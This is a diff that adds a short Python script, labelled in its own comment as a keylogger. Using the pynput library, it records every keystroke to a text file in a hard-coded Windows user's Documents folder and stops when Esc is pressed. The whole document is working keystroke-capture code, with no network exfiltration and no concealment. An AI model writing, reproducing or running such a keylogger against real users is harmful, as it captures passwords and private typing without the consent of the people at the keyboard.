@@ -1,0 +1,16 @@
+#This is a keylogger that records every key stroke and stores them in a text file
+
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir="C:\\Users\\alpha\\Documents"
+logging.basicConfig(filename=(log_dir+"\\keyLog.txt"), level=logging.DEBUG, format='%(message)s')
+
+def on_press(key):
+	logging.info(str(key))
+	if str(key)== 'Key.esc':
+		return False
+		
+with Listener(on_press=on_press) as listener:
+	listener.join()
+
